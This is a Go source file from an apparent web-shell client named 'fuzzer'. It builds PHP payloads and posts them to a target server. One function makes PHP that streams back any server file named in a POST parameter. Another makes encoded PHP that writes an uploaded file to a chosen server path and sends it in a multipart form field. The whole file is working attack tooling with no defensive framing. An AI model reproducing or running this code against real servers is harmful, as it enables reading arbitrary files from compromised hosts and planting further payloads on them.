package fuzzer

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"os"
	"path/filepath"
)

func buildHeader() string {
	var headers [8]string

	headers[0] = "header('Content-Description: File Transfer');"
	headers[1] = "header('Content-Type: application/octet-stream');"
	headers[2] = "header('Content-Disposition: attachment; filename='.basename($_POST['file']));"
	headers[3] = "header('Content-Transfer-Encoding: binary');"
	headers[4] = "header('Expires: 0');"
	headers[5] = "header('Cache-Control: must-revalidate, post-check=0, pre-check=0');"
	headers[6] = "header('Pragma: public');"
	headers[7] = "header('Content-Length: ' . filesize($_POST['file']));"

	var str string

	for _, header := range headers {
		str = str + header
	}

	return str
}

func Download() string {
	c1 := "if (file_exists($_POST['file'])) {"
	c2 := "}"
	headers := buildHeader()
	ob := "ob_clean();flush();readfile($_POST['file']);exit;"

	php := c1 + headers + ob + c2

	return php
}

func Upload(path, dir string) (*bytes.Buffer, string, bool) {
	php := "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
	php = Encode(php)

	file, err := os.Open(path)
	if err != nil {
		fmt.Println("Can't open file")
		fmt.Println(err)
		return nil, "", true
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		fmt.Println("Can't create part")
		fmt.Println(err)
		return nil, "", true
	}

	_, err = io.Copy(part, file)

	writer.WriteField("fuzzer", php)

	err = writer.Close()
	if err != nil {
		fmt.Println("Can't close")
		fmt.Println(err)
		return nil, "", true
	}

	return body, writer.FormDataContentType(), false
}
